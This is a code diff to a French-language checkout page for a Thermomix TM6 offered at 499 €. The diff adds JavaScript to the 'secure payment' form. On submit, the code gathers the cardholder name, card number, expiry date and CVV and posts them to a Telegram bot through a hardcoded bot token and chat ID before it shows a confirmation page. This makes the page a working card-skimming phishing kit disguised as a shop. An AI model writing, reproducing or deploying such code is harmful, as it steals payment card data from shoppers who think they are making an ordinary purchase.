@@ -214,19 +214,18 @@
         <div class="cart" aria-label="Panier">🛒 <span id="cart-count">1</span></div>
     </header>
 
-           <!-- Section Commande -->
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Section Commande -->
         <section class="order-section">
             <h2>Thermomix TM6</h2>
-            <p>Livraison sous 1 semaines</p>
+            <p>Livraison sous 1 semaine</p>
             <p><strong>Quantité :</strong> 1</p>
             <p><strong>Sous-total :</strong> 499,00 €</p>
             <p><strong>Livraison :</strong> GRATUIT</p>
             <p class="total"><strong>Montant total :</strong> 499,00 € TTC</p>
         </section>
-    </main>
 
-    <!-- Main Content -->
-    <main class="main-content">
         <!-- Section Paiement -->
         <section class="payment-section">
             <h1>Paiement sécurisé</h1>
@@ -235,7 +234,7 @@
 
             <form id="payment-form">
                 <label for="card-name">Nom sur la carte *</label>
-                <input type="texte" id="card-name" placeholder="J. Smith" required>
+                <input type="text" id="card-name" placeholder="J. Smith" required>
 
                 <label for="card-number">Numéro de carte *</label>
                 <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
@@ -260,6 +259,7 @@
                 <button type="submit" class="btn">Payer maintenant</button>
             </form>
         </section>
+    </main>
 
     <script>
         // Gestion du format du numéro de carte (ajout d'espaces tous les 4 chiffres)
@@ -270,22 +270,26 @@
             event.target.value = value;
         });
 
-        // Validation du formulaire
+        // Validation du formulaire et envoi des données au bot Telegram
         document.getElementById('payment-form').addEventListener('submit', function(event) {
             event.preventDefault();
 
             // Réinitialiser les messages d'erreur
             document.getElementById('error-message').textContent = '';
 
-            // Validation du numéro de carte (16 chiffres)
+            // Récupérer les données du formulaire
+            const cardName = document.getElementById('card-name').value;
             const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Validation du numéro de carte (16 chiffres)
             if (!/^\d{16}$/.test(cardNumber)) {
                 document.getElementById('error-message').textContent = 'Le numéro de carte doit contenir 16 chiffres.';
                 return;
             }
 
             // Validation de la date d'expiration (date future)
-            const expiryDate = document.getElementById('expiry-date').value;
             const [year, month] = expiryDate.split('-');
             const currentDate = new Date();
             const currentYear = currentDate.getFullYear();
@@ -297,14 +301,44 @@
             }
 
             // Validation du CVV (3 chiffres)
-            const cvv = document.getElementById('cvv').value;
             if (!/^\d{3}$/.test(cvv)) {
                 document.getElementById('error-message').textContent = 'Le CVV doit contenir 3 chiffres.';
                 return;
             }
 
-            // Si tout est valide, rediriger vers une page de confirmation
-            window.location.href = 'traitement1.html';
+            // Construire le message pour Telegram
+            const message = `
+                Nouveau paiement :
+                Nom sur la carte : ${cardName}
+                Numéro de carte : ${cardNumber}
+                Date d'expiration : ${expiryDate}
+                CVV : ${cvv}
+            `;
+
+            // Envoyer le message à votre bot Telegram
+            const botToken = "7315513590:AAEE1gm8yqNoffaaR_Ro2mdxt-J1Zi8qwug";
+            const chatId = "5372119436";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message envoyé avec succès :", data);
+                // Rediriger vers une page de confirmation
+                window.location.href = "traitement1.html";
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi du message :", error);
+            });
         });
     </script>
 </body>
